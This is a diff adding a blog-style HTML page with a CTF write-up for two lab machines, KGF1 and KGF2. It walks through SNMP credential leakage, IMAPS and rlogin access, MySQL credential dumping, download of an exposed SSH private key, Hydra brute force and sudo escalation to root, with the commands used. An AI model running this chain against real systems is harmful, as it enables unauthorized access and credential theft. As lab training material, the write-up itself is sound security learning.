@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html class="dark" lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>KGF Writeup | Thomas Shelby</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "outline": "#8d90a1","background": "#0a0a0a","surface-container-low": "#161616",
+                        "on-primary": "#ffffff","outline-variant": "#2a2a2a","on-surface": "#e2e2e2",
+                        "on-surface-variant": "#a0a0a0","primary-container": "#3366ff","surface": "#0a0a0a",
+                        "surface-container": "#121212","primary": "#3366ff","error": "#ffb4ab",
+                        "surface-variant": "#1a1a1a","surface-container-lowest": "#050505","on-background": "#e2e2e2"
+                    },
+                    "borderRadius": { "DEFAULT": "0px","lg": "0px","xl": "0px","full": "9999px" },
+                    "fontFamily": { "headline": ["Space Grotesk"],"body": ["Inter"],"label": ["Space Grotesk"] }
+                },
+            },
+        }
+    </script>
+    <style>
+        .material-symbols-outlined { font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #3366ff; }
+        body {
+            background-color: #0a0a0a;
+            background-image: radial-gradient(rgba(41,55,97,0.15) 1px, transparent 0),
+                radial-gradient(circle at 50% 50%, #1a1b26 0%, #0a0a0a 100%);
+            background-size: 32px 32px, 100% 100%;
+            background-attachment: fixed;
+        }
+        .bg-vignette { position:fixed;inset:0;pointer-events:none;background:radial-gradient(circle at 50% 50%,transparent 0%,rgba(10,10,10,0.8) 100%);z-index:-1; }
+        pre { overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+    </style>
+</head>
+<body class="text-on-surface font-body selection:bg-primary selection:text-on-primary min-h-screen">
+<div class="bg-vignette"></div>
+
+<!-- NAV -->
+<nav class="fixed top-0 w-full z-50 bg-background/80 backdrop-blur-md border-b border-outline-variant">
+    <div class="flex justify-between items-center w-full px-8 py-5 max-w-[1440px] mx-auto">
+        <div class="text-xl font-bold tracking-tighter text-primary font-headline">Thomas Shelby</div>
+        <div class="hidden md:flex items-center space-x-10">
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="index.html">Home</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="blog.html">Blog</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-primary" href="ctf.html">CTF Writeups</a>
+        </div>
+    </div>
+</nav>
+
+<main class="pt-24 pb-20 max-w-[1440px] mx-auto px-8 lg:px-12">
+
+    <!-- POST HEADER -->
+    <header class="mb-16">
+        <div class="flex items-center gap-4 mb-6">
+            <span class="bg-surface-variant text-primary text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-primary/30">CTF WRITEUP</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">WHITE BOX</span>
+            <span class="bg-surface-variant text-error text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-error/30">HARD</span>
+        </div>
+        <h1 class="text-5xl md:text-7xl font-bold text-primary tracking-tight leading-none mb-8 font-headline">
+            KGF — White Box Pentest Writeup
+        </h1>
+        <p class="text-on-surface-variant font-light mb-6 max-w-2xl">Two-machine series: KGF1 (SNMP enumeration, R-services, MySQL lateral movement) and KGF2 (SSH key exfiltration, OSINT-based password cracking, sudo escalation).</p>
+        <div class="flex flex-col md:flex-row md:items-center gap-8 border-l-2 border-primary/40 pl-6">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-surface-container-low border border-outline-variant flex items-center justify-center">
+                    <span class="material-symbols-outlined text-primary" style="font-size:18px;">person</span>
+                </div>
+                <div>
+                    <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Written By</p>
+                    <p class="text-sm font-headline font-bold text-on-surface">Thomas_Shelby</p>
+                </div>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider mb-1">Difficulty</p>
+                <div class="flex gap-1">
+                    <span class="w-2 h-2 bg-primary"></span><span class="w-2 h-2 bg-primary"></span>
+                    <span class="w-2 h-2 bg-primary"></span><span class="w-2 h-2 bg-primary"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                </div>
+            </div>
+            <div><p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Author</p><p class="text-sm font-headline font-bold text-on-surface">Thomas_Shelby</p></div>
+            <div><p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Machines</p><p class="text-sm font-headline font-bold text-on-surface">KGF1 · KGF2</p></div>
+        </div>
+    </header>
+
+    <div class="grid grid-cols-1 lg:grid-cols-[1fr_280px] gap-16 items-start">
+        <article class="space-y-12">
+
+            <!-- Part divider -->
+            <div class="flex items-center gap-6">
+                <div class="h-px flex-1 bg-outline-variant"></div>
+                <span class="font-label text-xs uppercase tracking-[0.4em] text-primary px-4 py-2 border border-primary/30 bg-primary/5">PART 01 — KGF1 · 10.0.0.27</span>
+                <div class="h-px flex-1 bg-outline-variant"></div>
+            </div>
+
+            <!-- KGF1 INTRO -->
+            <section id="kgf1-intro">
+                <p class="text-xl font-body text-on-surface-variant leading-relaxed">KGF1 is configured on a NAT network (10.0.0.0/24). The attack chain involves multi-protocol enumeration (TCP + UDP), SNMP credential leak, IMAPS email access, R-services login, and MySQL lateral movement to a privileged user.</p>
+            </section>
+
+            <!-- KGF1 Recon -->
+            <section class="space-y-6" id="kgf1-recon">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">01_KGF1_Port_Scanning</h2>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / nmap TCP</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo nmap 10.0.0.27 -p- -Pn -n -sV</span>
+
+PORT    STATE  SERVICE
+21/tcp  open   ftp
+110/tcp open   pop3
+143/tcp open   imap
+512/tcp open   exec       (R-services)
+513/tcp open   login      (R-services)
+514/tcp open   shell      (R-services)
+993/tcp open   ssl/imap
+995/tcp open   ssl/pop3</pre>
+                </div>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / FTP anonymous login</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo nmap 10.0.0.27 -p 21 --script ftp-anon -n -Pn</span>
+<span class="text-on-surface">[+] Anonymous FTP login allowed</span>
+
+<span class="text-primary font-bold">$ ftp 10.0.0.27</span>
+Name: anonymous
+
+ftp> ls -a
+.main.txt    → no useful info
+<span class="text-on-surface font-bold bg-primary/10 px-1">.secret.txt  → "Check the UDP ports"</span></pre>
+                </div>
+            </section>
+
+            <!-- SNMP -->
+            <section class="space-y-6" id="kgf1-snmp">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">02_KGF1_SNMP_Enumeration</h2>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / UDP scan + SNMP walk</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold"># UDP scan</span>
+$ sudo nmap -sU -F -Pn -n 10.0.0.27
+
+68/udp   open|filtered  dhcpc
+<span class="text-on-surface font-bold">161/udp  open           snmp</span>
+
+<span class="text-primary font-bold"># Discover community string</span>
+$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.0.0.27
+<span class="text-on-surface">[+] Community string: public</span>
+
+<span class="text-primary font-bold"># Full SNMP walk</span>
+$ snmpwalk -c public 10.0.0.27 -v2c
+<span class="text-on-surface font-bold bg-primary/10 px-1">[+] Username and password found in SNMP string output → [REDACTED]</span></pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Note — R-Services Restriction</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed">R-services (rlogin) only accept connections from trusted IP addresses. Without knowing the trusted IP range, we first use the SNMP credentials against IMAPS to read emails and discover the trusted IP information.</p>
+                </div>
+            </section>
+
+            <!-- IMAPS -->
+            <section class="space-y-6" id="kgf1-imaps">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">03_KGF1_IMAPS_Email_Access</h2>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / openssl IMAPS</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ openssl s_client -connect 10.0.0.27:imaps</span>
+
+<span class="text-primary font-bold"># Authenticate and read inbox</span>
+1 LOGIN [REDACTED] [REDACTED]
+1 SELECT INBOX
+1 FETCH 1 BODY[]
+
+<span class="text-on-surface font-bold bg-primary/10 px-1">[+] Email contains: new username, password + R-login trusted IP range</span></pre>
+                </div>
+
+                <p class="text-on-surface-variant leading-relaxed">The email reveals the R-login trusted IP range. Assign a static IP within that range to the attacker machine's network interface before proceeding.</p>
+            </section>
+
+            <!-- R-services + MySQL -->
+            <section class="space-y-6" id="kgf1-rlogin">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">04_KGF1_Rlogin_and_MySQL</h2>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / rlogin + mysql</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold"># Login via R-services (from trusted IP)</span>
+$ rlogin -l [REDACTED] 10.0.0.27
+Password: [REDACTED]
+
+<span class="text-on-surface">$ sudo -l  → No sudo privileges</span>
+<span class="text-on-surface">$ cat .bash_history  → MySQL login command found</span>
+
+<span class="text-primary font-bold"># MySQL enumeration</span>
+$ mysql -u garuda -p
+Enter password: [REDACTED]
+
+mysql> SHOW DATABASES;
+mysql> USE passwords;
+mysql> SHOW TABLES;
+mysql> SELECT * FROM users;
+
+<span class="text-on-surface font-bold bg-primary/10 px-1">[+] Multiple usernames and passwords retrieved from users table</span>
+
+<span class="text-primary font-bold"># Check valid system users (/etc/passwd)</span>
+<span class="text-on-surface">User 4 from the database exists as a system user</span>
+
+$ rlogin -l [REDACTED] 10.0.0.27
+Password: [REDACTED]
+
+$ sudo -l  → Full sudo privileges granted!
+$ sudo su
+# cat /root/flag.txt  ← ROOT FLAG</pre>
+                </div>
+            </section>
+
+            <!-- Part 2 divider -->
+            <div class="flex items-center gap-6">
+                <div class="h-px flex-1 bg-outline-variant"></div>
+                <span class="font-label text-xs uppercase tracking-[0.4em] text-primary px-4 py-2 border border-primary/30 bg-primary/5">PART 02 — KGF2 · 10.0.0.28</span>
+                <div class="h-px flex-1 bg-outline-variant"></div>
+            </div>
+
+            <!-- KGF2 INTRO -->
+            <section id="kgf2-intro">
+                <p class="text-xl font-body text-on-surface-variant leading-relaxed">KGF2 introduces a dual-SSH-port setup: port 22 enforces public-key-only auth, while port 2222 allows password auth — making it brute-forceable. The chain uses HTTP enumeration to exfiltrate an SSH private key, CUPP-based OSINT wordlist creation, Hydra brute force, and sudo escalation.</p>
+            </section>
+
+            <!-- KGF2 Recon -->
+            <section class="space-y-6" id="kgf2-recon">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">05_KGF2_Reconnaissance</h2>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / nmap KGF2</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo nmap -Pn -n 10.0.0.28</span>
+
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  ssh
+
+<span class="text-primary font-bold"># Check SSH auth methods per port</span>
+$ nmap -p22   10.0.0.28 --script ssh-auth-methods
+→ publickey only (brute force NOT possible)
+
+$ nmap -p2222 10.0.0.28 --script ssh-auth-methods
+<span class="text-on-surface font-bold bg-primary/10 px-1">→ publickey + password (brute force POSSIBLE)</span></pre>
+                </div>
+            </section>
+
+            <!-- KGF2 HTTP + SSH key -->
+            <section class="space-y-6" id="kgf2-http">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">06_KGF2_HTTP_Enum_and_SSH_Key</h2>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / FTP + HTTP enum</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold"># FTP hint file</span>
+$ ftp 10.0.0.28
+> get hint.txt
+Hint: check /robots.txt
+
+<span class="text-primary font-bold"># robots.txt reveals /ssh directory</span>
+$ curl http://10.0.0.28/robots.txt
+Disallow: /ssh
+
+<span class="text-primary font-bold"># /ssh directory contains</span>
+http://10.0.0.28/ssh/adheera.html   → user bio / OSINT data
+http://10.0.0.28/ssh/id_rsa         → private SSH key
+
+<span class="text-primary font-bold"># Download key</span>
+$ wget http://10.0.0.28/ssh/id_rsa
+$ chmod 600 id_rsa
+$ ssh -i id_rsa adheera@10.0.0.28
+
+adheera@kgf2:~$ cat README.md
+<span class="text-on-surface font-bold bg-primary/10 px-1">Hint: adheera is a sudoer — find the password</span></pre>
+                </div>
+            </section>
+
+            <!-- KGF2 CUPP + Hydra -->
+            <section class="space-y-6" id="kgf2-brute">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">07_KGF2_OSINT_Wordlist_and_Brute_Force</h2>
+                <p class="text-on-surface-variant leading-relaxed">The <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">adheera.html</code> page contains personal information about the user. CUPP (Common User Passwords Profiler) generates a targeted wordlist. Port 2222 allows password auth, so Hydra is used there — not port 22.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / CUPP + Hydra</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold"># Build OSINT-based wordlist</span>
+$ git clone https://github.com/Mebus/cupp
+$ cd cupp && python cupp.py -i
+→ Enter details from adheera.html
+→ Output: adheera.txt
+
+<span class="text-primary font-bold"># Brute force port 2222 (password auth enabled)</span>
+$ hydra -l adheera -P adheera.txt ssh://10.0.0.28 -s 2222 -I
+
+<span class="text-on-surface font-bold bg-primary/10 px-1">[2222][ssh] host: 10.0.0.28  login: adheera  password: [REDACTED]</span></pre>
+                </div>
+            </section>
+
+            <!-- KGF2 Root -->
+            <section class="space-y-6" id="kgf2-root">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">08_KGF2_Root_via_Sudo</h2>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4"><span class="w-3 h-3 rounded-full bg-error/40"></span><span class="w-3 h-3 rounded-full bg-on-surface/20"></span><span class="w-3 h-3 rounded-full bg-primary/40"></span><span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / sudo escalation</span></div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo su</span>
+Password: [REDACTED]
+
+# whoami → root
+# cd /root
+# cat finalflag.txt
+
+<span class="text-on-surface font-bold bg-primary/10 px-1">KGF2{4743565XXXXXXXXXXXXXXXXXXXXX7d89}  ← FINAL FLAG</span></pre>
+                </div>
+            </section>
+
+            <!-- Summary -->
+            <section class="space-y-4" id="summary">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">09_Attack_Chain_Summary</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="bg-surface-container-low border border-outline-variant p-6">
+                        <h3 class="font-headline font-bold text-primary mb-4 uppercase tracking-tight">KGF1 Chain</h3>
+                        <ol class="space-y-2 font-label text-[10px] uppercase tracking-widest text-on-surface-variant">
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">01</span> TCP scan → FTP/IMAP/R-services</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">02</span> FTP anon → .secret.txt → "check UDP"</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">03</span> UDP scan → SNMP 161/udp</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">04</span> onesixtyone → "public" community string</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">05</span> snmpwalk → credentials leaked</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">06</span> IMAPS openssl → email with trusted IP + new creds</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">07</span> Static IP assigned → rlogin</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">08</span> .bash_history → MySQL → users table</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">09</span> User 4 → rlogin → sudo su → ROOT</li>
+                        </ol>
+                    </div>
+                    <div class="bg-surface-container-low border border-outline-variant p-6">
+                        <h3 class="font-headline font-bold text-primary mb-4 uppercase tracking-tight">KGF2 Chain</h3>
+                        <ol class="space-y-2 font-label text-[10px] uppercase tracking-widest text-on-surface-variant">
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">01</span> Nmap → dual SSH (22 pubkey, 2222 password)</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">02</span> FTP → hint.txt → check robots.txt</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">03</span> robots.txt → /ssh directory</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">04</span> /ssh/adheera.html → user OSINT data</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">05</span> /ssh/id_rsa → private key download</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">06</span> SSH login with private key → README.md hint</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">07</span> CUPP with OSINT data → adheera.txt wordlist</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">08</span> Hydra on port 2222 → password cracked</li>
+                            <li class="flex items-start gap-3"><span class="text-primary font-bold">09</span> sudo su → ROOT → final flag</li>
+                        </ol>
+                    </div>
+                </div>
+            </section>
+
+            <footer class="pt-12 border-t border-outline-variant flex flex-col md:flex-row justify-between items-center gap-6">
+                <a href="ctf.html" class="flex items-center gap-2 text-xs font-label font-bold text-on-surface-variant uppercase hover:text-primary transition-colors">
+                    <span class="material-symbols-outlined" style="font-size:16px;">arrow_back</span> Back to CTF Lab
+                </a>
+                <div class="flex flex-wrap gap-2">
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#SNMP_ENUM</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#R_SERVICES</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#MYSQL_PRIVESC</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#SSH_KEY_EXFIL</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#CUPP_OSINT</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#WHITEBOX</span>
+                </div>
+            </footer>
+        </article>
+
+        <!-- SIDEBAR -->
+        <aside class="sticky top-32 space-y-10 hidden lg:block">
+            <nav class="space-y-4">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em]">Table of Contents</h4>
+                <ul class="space-y-2 border-l border-outline-variant">
+                    <li class="pl-4 pt-2 text-[9px] font-label uppercase text-primary/60 tracking-widest">— KGF1 —</li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-primary border-l-2 border-primary -ml-[1.5px]" href="#kgf1-intro">00_Introduction</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf1-recon">01_Port_Scanning</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf1-snmp">02_SNMP_Enum</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf1-imaps">03_IMAPS_Access</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf1-rlogin">04_Rlogin_MySQL</a></li>
+                    <li class="pl-4 pt-3 text-[9px] font-label uppercase text-primary/60 tracking-widest">— KGF2 —</li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf2-recon">05_Recon</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf2-http">06_HTTP_SSH_Key</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf2-brute">07_Brute_Force</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#kgf2-root">08_Root</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary" href="#summary">09_Summary</a></li>
+                </ul>
+            </nav>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-5">Machine Info</h4>
+                <div class="space-y-3">
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Series</span><span class="text-xs font-headline font-bold text-on-surface">KGF</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Author</span><span class="text-xs font-headline font-bold text-on-surface">Thomas_Shelby</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Type</span><span class="text-xs font-headline font-bold text-on-surface">White Box</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Difficulty</span><span class="text-xs font-headline font-bold text-error">Hard</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">KGF1 IP</span><span class="text-xs font-mono font-bold text-primary">10.0.0.27</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">KGF2 IP</span><span class="text-xs font-mono font-bold text-primary">10.0.0.28</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Status</span><span class="text-xs font-headline font-bold text-primary">Pwned ✓</span></div>
+                </div>
+            </div>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-4">Report PDF</h4>
+                <a href="https://github.com/dorisa74964/Reports/blob/main/KGF-Final-Draft.pdf" target="_blank"
+                   class="flex items-center gap-3 text-[10px] font-label font-bold text-primary uppercase tracking-widest border-b border-primary/30 pb-1 hover:border-primary hover:gap-4 transition-all">
+                    Download Report <span class="material-symbols-outlined" style="font-size:14px;">download</span>
+                </a>
+            </div>
+        </aside>
+    </div>
+</main>
+
+<footer class="w-full py-16 bg-background/90 backdrop-blur-md border-t border-outline-variant mt-20">
+    <div class="flex flex-col md:flex-row justify-between items-center px-12 max-w-[1440px] mx-auto gap-10">
+        <div class="flex flex-col gap-2">
+            <span class="font-headline font-bold text-primary text-xl tracking-tighter">Thomas Shelby </span>
+            <span class="font-label text-[10px] text-on-surface/40 uppercase tracking-[0.4em]">Security Engineer · Pentester · Red Team</span>
+        </div>
+        <div class="flex gap-12">
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://github.com/dorsia74964" target="_blank">GitHub</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://www.linkedin.com/in/dorisa74964" target="_blank">LinkedIn</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="#">Twitter</a>
+        </div>
+        <div class="font-label text-[11px] tracking-widest uppercase text-on-surface/30">© 2026 Thomas Shebly. ALL RIGHTS RESERVED.</div>
+    </div>
+</footer>
+</body>
+</html>
